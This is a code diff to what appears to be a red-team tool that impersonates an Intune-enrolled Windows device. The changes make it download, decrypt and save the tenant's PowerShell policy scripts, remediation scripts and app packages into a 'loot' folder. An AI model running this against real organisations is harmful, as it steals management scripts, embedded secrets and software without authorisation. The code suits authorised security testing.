@@ -11,11 +11,12 @@ import xmltodict
 import xml.etree.ElementTree as ET
 from datetime import datetime, timedelta, timezone
 from device.device import Device
-from utils.utils import prtauth, extract_pfx, save_encrypted_message_as_smime, decrypt_smime_file, aes_decrypt, renew_token
+from utils.utils import prtauth, extract_pfx, save_encrypted_message_as_smime, decrypt_smime_file, aes_decrypt, renew_token, write_file
 from cryptography import x509
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.serialization import Encoding
 
+outdir = os.path.join(os.getcwd(), 'loot')
 
 class Windows(Device):
     def __init__(self, logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy):
@@ -393,31 +394,46 @@ class Windows(Device):
 
         ime = IME(self.device_name, certpath, keypath)
         
-        self.logger.info(f'downloading scripts...')
+        self.logger.info(f'Downloading scripts...')
         policies = ime.request_policy()
         if len(policies) == 0:
-            self.logger.error(f'available scripts not found')
+            self.logger.error(f'Available scripts not found')
         else:
-            self.logger.alert(f'scripts found!')
+            self.logger.alert(f'Scripts found!')
             i = 1
             for policy in policies:
-                self.logger.info(f'#{i} (policyid:{policy["PolicyId"]}):\n')
-                print(policy["PolicyBody"] + '\n')
-                i=i+1
+                i += 1
+                policyID = policy["PolicyId"]
+                policyBody = (policy["PolicyBody"])
+                encryptedPolicyBody = policy['EncryptedPolicyBody']
 
-        self.logger.info(f'downloading win32apps...')
+                self.logger.info(f'#{i} (Policy ID:{policyID}):\n')
+
+                if policy["EncryptedPolicyBody"]:
+                    decrypted = ime.decrypt_encrypted_policy_body(encryptedPolicyBody)
+                    write_file(filepath=os.path.join(outdir, "app_scripts"), filename=f'policy_script_{policyID}_decrypted.ps1', content=decrypted)
+                    print(decrypted + '\n')
+                if policy["PolicyBody"]:
+                    print(policyBody + '\n')
+                    write_file(filepath=os.path.join(outdir, "app_scripts"), filename=f'policy_script_{policyID}.ps1', content=policyBody)
+
+
+        self.logger.info(f'Downloading win32apps...')
         apps = ime.get_selected_app()
         if len(apps) == 0:
-            self.logger.error(f'available intunewin file not found')
+            self.logger.error(f'Available intunewin file not found')
 
         for app in apps:
-            self.logger.alert(f'found {app["Name"]}!')
+            app_name = app['Name']
             content_info = ime.get_content_info(app)
             upload_location = json.loads(content_info["ContentInfo"])["UploadLocation"]
-            decrypt_info = ime.decrypt_decryptinfo(content_info["DecryptInfo"])            
-            self.logger.info(f'downloading from {upload_location} ...')
-            ime.download_decrypt_intunewin(app["Name"], upload_location, decrypt_info["EncryptionKey"], decrypt_info["IV"])
-            self.logger.success(f'successfully downloaded to {app["Name"]}.intunewin!')
+            decrypt_info = ime.decrypt_decryptinfo(content_info["DecryptInfo"])
+
+            self.logger.alert(f'Found {app_name}, downloading...')
+            self.logger.debug(f'Downloading: {upload_location} ...')
+
+            ime.download_intunewin(app_name, upload_location, decrypt_info)
+            self.logger.success(f'Successfully downloaded {app_name}.intunewin!')
 
 
         os.remove(certpath)
@@ -429,23 +445,35 @@ class Windows(Device):
         extract_pfx(mdmpfx, certpath, keypath)
 
         ime = IME(self.device_name, certpath, keypath)
-        
-        self.logger.info(f'downloading remediation scripts...')
+
+        self.logger.info(f'Downloading remediation scripts...')
         scripts = ime.get_remediation_scripts()
         if len(scripts) == 0:
-            self.logger.error(f'available remediation scripts not found')
+            self.logger.error(f'Available remediation scripts not found')
         else:
-            self.logger.alert(f'remediation scripts found!')
+            self.logger.alert(f'Remediation scripts found!')
             i = 1
             for script in scripts:
-                self.logger.info(f'#{i} (Remediation/Policy ID:{script["PolicyId"]}):\n')
-                print("Detection Script Parameters:" + script["PolicyScriptParameters"])
-                print("Detection Script:")
-                print(base64.b64decode(script["PolicyBody"]).decode('utf-8') + '\n')
-                print("Remediation Script Parameters:" + script["RemediationScriptParameters"])
-                print("Remediation Script:")
-                print(base64.b64decode(script["RemediationScript"]).decode('utf-8') + '\n')
-                i=i+1
+                policyID = script["PolicyId"]
+                policyParameters = script["PolicyScriptParameters"]
+                policyBody = base64.b64decode(script["PolicyBody"]).decode('utf-8')
+                remediationParameters = script["RemediationScriptParameters"]
+                remediationBody = base64.b64decode(script["RemediationScript"]).decode('utf-8')
+
+                self.logger.info(f'#{i} (Remediation/Policy ID:{policyID}):\n')
+                print(f"Detection Script Parameters:\n{policyParameters}")
+                print(f"Detection Script:\n{policyBody}")
+                print(f"Remediation Script Parameters:\n{remediationParameters}")
+                print(f"Remediation Script:\n{remediationBody}")
+
+                write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_detection_script.ps1', content=policyBody)
+                write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_remediation_script.ps1', content=remediationBody)
+
+                if remediationParameters != "":
+                    write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_remediation_script_parameters.txt', content=json.dumps(remediationParameters, indent=4))
+                if policyParameters != "":
+                    write_file(filepath=os.path.join(outdir, "remediation_scripts"), filename=f'{policyID}_detection_script_parameters.txt', content=json.dumps(policyParameters, indent=4))
+                i += 1
 
         os.remove(certpath)
         os.remove(keypath)
@@ -513,11 +541,23 @@ class IME():
         end = decryptinfo.find('</EncryptedContent>')
         encrypted_content = decryptinfo[start:end].strip()
         smime_file = 'smime.p7m'
+        #print(encrypted_content)
         save_encrypted_message_as_smime(encrypted_content, smime_file)
         decrypted_content = decrypt_smime_file(smime_file, self.keypath)
+        #print(decrypted_content)
         decrypt_info = json.loads(decrypted_content)
         os.remove(smime_file)
         return decrypt_info
+    
+    def decrypt_encrypted_policy_body(self, encryptedPolicyBody):
+        start = encryptedPolicyBody.find('<EncryptedContent>') + len('<EncryptedContent>')
+        end = encryptedPolicyBody.find('</EncryptedContent>')
+        encrypted_content = encryptedPolicyBody[start:end].strip()
+        smime_file = 'smime.p7m'
+        save_encrypted_message_as_smime(encrypted_content, smime_file)
+        decrypted_content = decrypt_smime_file(smime_file, self.keypath)
+        os.remove(smime_file)
+        return decrypted_content
 
     def decompress_string(self, compressed_text):
         buffer = base64.b64decode(compressed_text)
@@ -617,14 +657,19 @@ class IME():
         response_payload = response.json()["ResponsePayload"]
         return json.loads(response_payload)
 
-    def download_decrypt_intunewin(self, appname, upload_location, key, iv):
-        response = requests.get(
-            url=upload_location
-        )
+    def download_intunewin(self, appname, upload_location, decrypt_info):
+        response = requests.get(url=upload_location)
 
-        decrypted_data = aes_decrypt(key, iv, response.content[48:])
-        with open(f'{appname}.intunewin', 'wb') as f:
-            f.write(decrypted_data)        
+        if decrypt_info['ProfileIdentifier'] == 'NoEncryption':
+            # No encryption
+            data = response.content
+        else:
+            # Encrypted
+            key = decrypt_info["EncryptionKey"]
+            iv = decrypt_info['IV']
+            data = aes_decrypt(key, iv, response.content[48:])
+        
+        write_file(filepath=os.path.join(outdir, "apps_intunewin"), filename=f'{appname}.intunewin', content=data)
 
     def request_policy(self):
         sidecar_url = self.resolve_service_address()
